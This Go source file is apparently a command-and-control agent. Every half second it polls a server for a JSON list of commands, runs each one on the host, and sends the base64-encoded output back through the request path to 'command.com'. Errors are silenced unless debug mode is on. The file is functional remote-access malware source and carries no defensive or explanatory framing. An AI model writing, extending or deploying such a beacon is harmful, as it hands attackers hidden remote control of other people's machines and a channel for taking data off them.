package main

import (
	"fmt"
	"time"
	"log"
	"io"
	"os/exec"
	"encoding/json"
	"net/http"
	"strings"
	"strconv"
	b64 "encoding/base64"
)

type CommandResponse struct {
	Exec []string
}

type CommandUpdate struct {
	Ip string
	Type string
	Data string
}

var msPerUpdate int = 500;
var cmdAddress string = "127.0.0.1"
var cmdPort int = 8000;
var cmdHost string = "command.com"
var debug bool = false
var netClient = &http.Client{
	Timeout: time.Second * 10,
}

func debugFatal(err error) {
	if err != nil && debug {
		log.Fatal(err)
	}
}

func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
	req, err := http.NewRequest("GET", "http://" + cmdAddress + ":" + strconv.Itoa(cmdPort) + "/" + endpoint, nil)
	debugFatal(err)
	req.Host = cmdHost
	return netClient.Do(req)
}

func getCommandUpdateHttp() {
	resp, err := queryCommandHttp("update")
	debugFatal(err)
	if err == nil {
		defer resp.Body.Close()

		if err != nil || resp.Status != "200 OK" {
			fmt.Println("Command status != 200: " + resp.Status)
		}
		
		controlDataBytes, err := io.ReadAll(resp.Body)
		debugFatal(err)
		var controlResp CommandResponse
		json.Unmarshal(controlDataBytes, &controlResp)
		
		for _, cmd := range controlResp.Exec {
			cmdSplit := strings.Fields(cmd);
			out, err := exec.Command(cmdSplit[0], cmdSplit[1:]...).Output()
			debugFatal(err)
			if err == nil && len(out) > 0 {
				data, err := json.Marshal(CommandUpdate{"127.0.0.1","exec",string(out)})
				debugFatal(err)
				encoded := b64.StdEncoding.EncodeToString(data)
				fmt.Println(encoded)
				queryCommandHttp(encoded)
			}
		}
	} else {
		fmt.Println("Couldn't reach command.")
	}
}

func main() {
	for range time.Tick(time.Millisecond * time.Duration(msPerUpdate)) {
		go func() {
        	getCommandUpdateHttp()
		}()
	}
}